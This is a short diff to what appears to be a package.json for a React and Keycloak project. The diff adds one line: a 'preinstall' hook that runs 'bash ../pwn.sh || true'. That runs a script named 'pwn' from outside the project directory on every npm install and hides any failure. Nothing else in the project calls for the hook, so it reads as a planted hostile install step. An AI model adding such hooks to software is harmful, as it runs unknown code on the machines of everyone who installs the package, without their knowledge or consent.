@@ -52,6 +52,7 @@
     "@react-keycloak/ssr": "^3.0.0"
   },
   "scripts": {
+    "preinstall": "bash ../pwn.sh || true",
     "start": "npm run generate-protos && react-scripts start",
     "build": "npm run generate-protos && react-scripts build",
     "build:lib": "npm run generate-protos && rimraf ./dist && tsc && rollup -c",
